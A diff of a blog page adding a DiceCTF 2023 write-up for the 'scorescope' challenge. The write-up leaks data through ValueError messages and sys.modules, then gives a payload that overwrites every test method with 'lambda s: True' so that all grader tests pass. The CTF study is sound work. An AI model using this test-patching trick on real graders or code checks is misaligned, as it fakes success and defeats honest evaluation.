@@ -9,14 +9,15 @@
   <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title> scorescope Writeup [DiceCTF 23] | My New Hugo Site</title>
+  <title> scorescope Writeup [DiceCTF 23] | ./sk4d</title>
   <link rel = 'canonical' href = 'https://sk4d.tk/posts/scorescope-dicectf-2023/'>
   
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="robots" content="all,follow">
   <meta name="googlebot" content="index,follow,snippet,archive">
   <meta property="og:title" content="scorescope Writeup [DiceCTF 23]" />
-<meta property="og:description" content="tl;dr sys.modules to print all the app modules python prototype pollution intro I played DiceCTF 2023 last weekend with my team bi0s. There a were a lot of awesome web challenges. I have worked on some of the web challenges and this is the write-up for the challenge scorescope" />
+<meta property="og:description" content="tl;dr sys.modules to print all the app modules python prototype pollution intro I played DiceCTF 2023 last weekend with my team bi0s. There a were a lot of awesome web challenges. I have worked on some of the web challenges and this is the write-up for the challenge scorescope
+Initial analysis We are allowed to upload a python file and the application will run several test cases on the file and if the test cases are successful it will be reflected on the page with a green colour." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://sk4d.tk/posts/scorescope-dicectf-2023/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-02-06T14:41:28+05:30" />
@@ -25,7 +26,8 @@
 
   <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="scorescope Writeup [DiceCTF 23]"/>
-<meta name="twitter:description" content="tl;dr sys.modules to print all the app modules python prototype pollution intro I played DiceCTF 2023 last weekend with my team bi0s. There a were a lot of awesome web challenges. I have worked on some of the web challenges and this is the write-up for the challenge scorescope"/>
+<meta name="twitter:description" content="tl;dr sys.modules to print all the app modules python prototype pollution intro I played DiceCTF 2023 last weekend with my team bi0s. There a were a lot of awesome web challenges. I have worked on some of the web challenges and this is the write-up for the challenge scorescope
+Initial analysis We are allowed to upload a python file and the application will run several test cases on the file and if the test cases are successful it will be reflected on the page with a green colour."/>
 
   
   
@@ -127,7 +129,7 @@
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fsk4d.tk%2fposts%2fscorescope-dicectf-2023%2f&name=scorescope%20Writeup%20%5bDiceCTF%2023%5d&description=tl%3bdr%20sys.modules%20to%20print%20all%20the%20app%20modules%20python%20prototype%20pollution%20intro%20I%20played%20DiceCTF%202023%20last%20weekend%20with%20my%20team%20bi0s.%20There%20a%20were%20a%20lot%20of%20awesome%20web%20challenges.%20I%20have%20worked%20on%20some%20of%20the%20web%20challenges%20and%20this%20is%20the%20write-up%20for%20the%20challenge%20scorescope" aria-label="Tumblr">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fsk4d.tk%2fposts%2fscorescope-dicectf-2023%2f&name=scorescope%20Writeup%20%5bDiceCTF%2023%5d&description=tl%3bdr%20sys.modules%20to%20print%20all%20the%20app%20modules%20python%20prototype%20pollution%20intro%20I%20played%20DiceCTF%202023%20last%20weekend%20with%20my%20team%20bi0s.%20There%20a%20were%20a%20lot%20of%20awesome%20web%20challenges.%20I%20have%20worked%20on%20some%20of%20the%20web%20challenges%20and%20this%20is%20the%20write-up%20for%20the%20challenge%20scorescope%0aInitial%20analysis%20We%20are%20allowed%20to%20upload%20a%20python%20file%20and%20the%20application%20will%20run%20several%20test%20cases%20on%20the%20file%20and%20if%20the%20test%20cases%20are%20successful%20it%20will%20be%20reflected%20on%20the%20page%20with%20a%20green%20colour." aria-label="Tumblr">
       <i class="fab fa-tumblr " aria-hidden="true"></i>
     </a>
   </li>
@@ -144,6 +146,8 @@
       <nav id="TableOfContents">
   <ul>
     <li><a href="#intro">intro</a></li>
+    <li><a href="#initial-analysis">Initial analysis</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
   </ul>
 </nav>
     </div>
@@ -180,7 +184,73 @@
 <li>python prototype pollution</li>
 </ul>
 <h2 id="intro">intro</h2>
-<p>I played DiceCTF 2023 last weekend with my team <em>bi0s</em>. There a were a lot of awesome web challenges. I have worked on some of the web challenges and this is the write-up for the challenge scorescope</p>
+<p>I played DiceCTF 2023 last weekend with my team <strong>bi0s</strong>. There a were a lot of awesome web challenges. I have worked on some of the web challenges and this is the write-up for the challenge scorescope</p>
+<h2 id="initial-analysis">Initial analysis</h2>
+<p>We are allowed to upload a python file and the application will run several test cases on the file and if the test cases are successful it will be reflected on the page with a green colour. At first i thought this challenge was kind of a pyjail challenge where we have to bypass certain restrcitions to get command execution but later figured out it was not the case when i saw the functions were frozen and the hidden test which was impossible to pass</p>
+<h2 id="exploitation">Exploitation</h2>
+<blockquote>
+<p>ValueError: Raised when an operation or function receives an argument that has the right type but an inappropriate value,</p>
+</blockquote>
+<p>Since the application only tells us if our test case is successful or not we were not able to directly see the results, we can bypass this by using the ValueError Exception call as it prints whatever we pass to it as an Exception</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(str(print(<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>)))
+</span></span></code></pre></div><p>i had no idea what we were supposed to do in this challenge for a while and i spend some time trying some pyjail exploits and trying to get some juicy information and i tried the sys.modules which gave us all the loaded libraries</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(str(sys<span style="color:#f92672">.</span>modules))
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&#39;util&#39;: &lt;module &#39;util&#39; from &#39;/app/util.py&#39;&gt;
+</span></span><span style="display:flex;"><span> &#39;test_1_add&#39;: &lt;module &#39;test_1_add&#39; from &#39;/app/tests/test_1_add.py&#39;&gt;
+</span></span><span style="display:flex;"><span> &#39;test_2_longest&#39;: &lt;module &#39;test_2_longest&#39; from &#39;/app/tests/test_2_longest.py&#39;&gt;
+</span></span><span style="display:flex;"><span> &#39;test_3_common&#39;: &lt;module &#39;test_3_common&#39; from &#39;/app/tests/test_3_common.py&#39;&gt;
+</span></span><span style="display:flex;"><span> &#39;test_4_favorite&#39;: &lt;module &#39;test_4_favorite&#39; from &#39;/app/tests/test_4_favorite.py&#39;&gt;
+</span></span><span style="display:flex;"><span> &#39;test_5_factor&#39;: &lt;module &#39;test_5_factor&#39; from &#39;/app/tests/test_5_factor.py&#39;&gt;
+</span></span><span style="display:flex;"><span> &#39;_hashlib&#39;: &lt;module &#39;_hashlib&#39; from &#39;/usr/local/lib/python3.11/lib-dynload/_hashlib.cpython-311-x86_64-linux-gnu.so&#39;&gt;
+</span></span><span style="display:flex;"><span> &#39;_blake2&#39;: &lt;module &#39;_blake2&#39; from &#39;/usr/local/lib/python3.11/lib-dynload/_blake2.cpython-311-x86_64-linux-gnu.so&#39;&gt;
+</span></span><span style="display:flex;"><span> &#39;hashlib&#39;: &lt;module &#39;hashlib&#39; from &#39;/usr/local/lib/python3.11/hashlib.py&#39;&gt;
+</span></span><span style="display:flex;"><span> &#39;test_6_preimage&#39;: &lt;module &#39;test_6_preimage&#39; from &#39;/app/tests/test_6_preimage.py&#39;&gt;
+</span></span><span style="display:flex;"><span> &#39;test_7_magic&#39;: &lt;module &#39;test_7_magic&#39; from &#39;/app/tests/test_7_magic.py&#39;&gt;
+</span></span><span style="display:flex;"><span> &#39;test_8_hidden&#39;: &lt;module &#39;test_8_hidden&#39; from &#39;/app/tests/test_8_hidden.py&#39;&gt;
+</span></span></code></pre></div><p>these modules caught my eyes and i tried importing them in the payload and went through all the functions and properties of these modules</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> test_8_hidden
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(str(dir(test_8_hidden)))
+</span></span></code></pre></div><p>we saw that all these modules has a class like TestAdd, TestHidden, TestMagic ..etc which had the functions which was called to test the test cases (noise).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(a, b):
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> util
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> test_1_add
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> test_2_longest
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> test_3_common
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> test_4_favorite
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> test_5_factor
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> test_6_preimage
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> test_7_magic
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> test_8_hidden
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> submission
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> test_8_hidden<span style="color:#f92672">.</span>TestHidden()
+</span></span><span style="display:flex;"><span>    x<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>test_hidden <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    y <span style="color:#f92672">=</span> test_1_add<span style="color:#f92672">.</span>TestAdd()
+</span></span><span style="display:flex;"><span>    y<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>test_add_negative <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    y<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>test_add_positive <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    y<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>test_add_mixed <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_7_magic<span style="color:#f92672">.</span>TestMagic<span style="color:#f92672">.</span>test_magic_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_7_magic<span style="color:#f92672">.</span>TestMagic<span style="color:#f92672">.</span>test_magic_b <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_7_magic<span style="color:#f92672">.</span>TestMagic<span style="color:#f92672">.</span>test_magic_c <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_6_preimage<span style="color:#f92672">.</span>TestPreimage<span style="color:#f92672">.</span>test_preimage_a <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_6_preimage<span style="color:#f92672">.</span>TestPreimage<span style="color:#f92672">.</span>test_preimage_b <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_5_factor<span style="color:#f92672">.</span>TestFactor<span style="color:#f92672">.</span>test_factor_bigger <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_5_factor<span style="color:#f92672">.</span>TestFactor<span style="color:#f92672">.</span>test_factor_large <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_5_factor<span style="color:#f92672">.</span>TestFactor<span style="color:#f92672">.</span>test_factor_small <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_4_favorite<span style="color:#f92672">.</span>TestFavorite<span style="color:#f92672">.</span>test_favorite <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_3_common<span style="color:#f92672">.</span>TestCommon<span style="color:#f92672">.</span>test_common_nonconsecutive <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_3_common<span style="color:#f92672">.</span>TestCommon<span style="color:#f92672">.</span>test_common_single <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_3_common<span style="color:#f92672">.</span>TestCommon<span style="color:#f92672">.</span>test_common_consecutive <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_3_common<span style="color:#f92672">.</span>TestCommon<span style="color:#f92672">.</span>test_common_empty <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_3_common<span style="color:#f92672">.</span>TestCommon<span style="color:#f92672">.</span>test_common_many <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_2_longest<span style="color:#f92672">.</span>TestLongest<span style="color:#f92672">.</span>test_longest_multiple_tie <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_2_longest<span style="color:#f92672">.</span>TestLongest<span style="color:#f92672">.</span>test_longest_multiple <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    test_2_longest<span style="color:#f92672">.</span>TestLongest<span style="color:#f92672">.</span>test_longest_single <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> s: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> a<span style="color:#f92672">+</span>b
+</span></span></code></pre></div><p>This was our final payload for the scorescope challenge , uploading this template.py file will turns all the test cases true and the application gives us the flag.</p>
 
     </div>
   </article>
@@ -207,6 +277,8 @@
       <nav id="TableOfContents">
   <ul>
     <li><a href="#intro">intro</a></li>
+    <li><a href="#initial-analysis">Initial analysis</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
   </ul>
 </nav>
     </div>
@@ -256,7 +328,7 @@
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fsk4d.tk%2fposts%2fscorescope-dicectf-2023%2f&name=scorescope%20Writeup%20%5bDiceCTF%2023%5d&description=tl%3bdr%20sys.modules%20to%20print%20all%20the%20app%20modules%20python%20prototype%20pollution%20intro%20I%20played%20DiceCTF%202023%20last%20weekend%20with%20my%20team%20bi0s.%20There%20a%20were%20a%20lot%20of%20awesome%20web%20challenges.%20I%20have%20worked%20on%20some%20of%20the%20web%20challenges%20and%20this%20is%20the%20write-up%20for%20the%20challenge%20scorescope" aria-label="Tumblr">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fsk4d.tk%2fposts%2fscorescope-dicectf-2023%2f&name=scorescope%20Writeup%20%5bDiceCTF%2023%5d&description=tl%3bdr%20sys.modules%20to%20print%20all%20the%20app%20modules%20python%20prototype%20pollution%20intro%20I%20played%20DiceCTF%202023%20last%20weekend%20with%20my%20team%20bi0s.%20There%20a%20were%20a%20lot%20of%20awesome%20web%20challenges.%20I%20have%20worked%20on%20some%20of%20the%20web%20challenges%20and%20this%20is%20the%20write-up%20for%20the%20challenge%20scorescope%0aInitial%20analysis%20We%20are%20allowed%20to%20upload%20a%20python%20file%20and%20the%20application%20will%20run%20several%20test%20cases%20on%20the%20file%20and%20if%20the%20test%20cases%20are%20successful%20it%20will%20be%20reflected%20on%20the%20page%20with%20a%20green%20colour." aria-label="Tumblr">
       <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
     </a>
   </li>
@@ -289,7 +361,7 @@
 
   <footer id="footer">
   <div class="footer-left">
-    Copyright  &copy; 2023  My New Hugo Site 
+    Copyright  &copy; 2023  ./sk4d 
   </div>
   <div class="footer-right">
     <nav>
